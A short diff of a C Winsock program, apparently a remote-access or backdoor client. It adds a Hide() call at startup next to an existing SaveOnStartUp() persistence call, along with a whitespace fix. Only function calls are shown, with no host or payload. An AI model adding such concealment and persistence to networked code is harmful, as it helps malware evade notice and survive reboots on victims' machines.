@@ -7,10 +7,11 @@ SOCKET sock;
 WSADATA wsa;
 
 int main(int argc, char const *argv[]) {
+	Hide();
 
 	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
 	    printf("Failed. Error Code: %d\n", WSAGetLastError());
-	    return 0;	
+	    return 0;
 	}
 
 	SaveOnStartUp();
